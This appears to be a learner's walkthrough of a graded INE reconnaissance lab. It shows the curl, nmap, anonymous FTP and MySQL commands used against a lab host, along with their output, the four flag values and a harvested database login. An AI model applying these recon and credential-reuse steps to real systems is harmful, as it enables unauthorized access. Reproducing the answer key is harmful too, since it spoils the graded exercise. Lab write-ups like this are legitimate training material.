Completing Skill Check Labs
Skill Check Labs are interactive, hands-on exercises designed to validate the knowledge and skills you’ve gained in this course through real-world scenarios. Each lab presents practical tasks that require you to apply what you’ve learned. Unlike other INE labs, solutions are not provided, challenging you to demonstrate your understanding and problem-solving abilities. Your performance is graded, allowing you to track progress and measure skill growth over time.

Lab Environment
In this lab environment, you will be provided with GUI access to a Kali Linux machine. The target machine will be accessible at http://target.ine.local.

Objective: Perform reconnaissance on the target and capture all the flags hidden within the environment.

Flags to Capture:

Flag 1: The server proudly announces its identity in every response. Look closely; you might find something unusual.
```
    curl-itarget.ine.local/robots.txt
            HTTP/1.1200OK
            Server:Werkzeug/3.0.6Python/3.10.12
            Date:Sat,21Feb202615:54:53GMT
            Content-Disposition:inline;filename=robots.txt
            Content-Type:text/plain;charset=utf-8
            Content-Length:96
            Last-Modified:Tue,28May202405:55:46GMT
            Cache-Control:no-cache
            ETag:"1716875746.0-96-1581123710"
            Date:Sat,21Feb202615:54:53GMT
            Server:FLAG1_ec29eb45437c4f6693926c26dcd84a8e '<-Flag 1'
            Connection:close

            User-agent:googlebot
            Disallow:/photos

            User-agent:*
            Disallow:/secret-info/
            Disallow:/data/
```

Flag 2: The gatekeeper's instructions often reveal what should remain unseen. Don't forget to read between the lines.
```
    curl target.ine.local/secret-info/flag.txt 
        FLAG2_75bd14660b784dcca570f506052cb556
```

Flag 3: Anonymous access sometimes leads to forgotten treasures. Connect and explore the directory; you might stumble upon something valuable.
```
nmap target.ine.local -sS -sV
    nmap target.ine.local -sC -p21,22,25,80,143,993,3306
        PORT     STATE SERVICE  VERSION
        21/tcp   open  ftp      vsftpd 3.0.5
        22/tcp   open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
        25/tcp   open  smtp     Postfix smtpd
        80/tcp   open  http     Werkzeug/3.0.6 Python/3.10.12
        143/tcp  open  imap     Dovecot imapd (Ubuntu)
        993/tcp  open  ssl/imap Dovecot imapd (Ubuntu)
        3306/tcp open  mysql    MySQL 8.0.39-0ubuntu0.22.04.1

    nmap target.ine.local -sC -p 21
        Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-21 20:39 IST
        Nmap scan report for target.ine.local (192.44.62.3)
        Host is up (0.000041s latency).

        PORT   STATE SERVICE
        21/tcp open  ftp
        | ftp-anon: Anonymous FTP login allowed (FTP code 230)
        | -rw-r--r--    1 0        0              22 Oct 28  2024 creds.txt
        |_-rw-r--r--    1 0        0              39 Feb 21 14:50 flag.txt
        | ftp-syst: 
        |   STAT: 
        | FTP server status:
        |      Connected to ::ffff:192.44.62.2
        |      Logged in as ftp
        |      TYPE: ASCII
        |      No session bandwidth limit
        |      Session timeout in seconds is 300
        |      Control connection is plain text
        |      Data connections will be plain text
        |      At session startup, client count was 1
        |      vsFTPd 3.0.5 - secure, fast, stable
        |_End of status

    ftp -p target.ine.local 21 
    Anonymous:Anonymous@ftp.com
        get flag.txt 
            FLAG3_873cdd8898944fd69c813f0ac2d3a4da
        get creds.txt 
            db_admin:password@123

```

Flag 4: A well-named database can be quite revealing. Peek at the configurations to discover the hidden treasure.
Tools
```
    mysql -u db_admin -ppassword@123 -h target.ine.local 
        SELECT schema_name FROM information_schema.schemata;
            FLAG4_46ea04b44c324ee49757601700ef4a24
```


The best tools for this lab are:

Nmap
FTP
MySQL
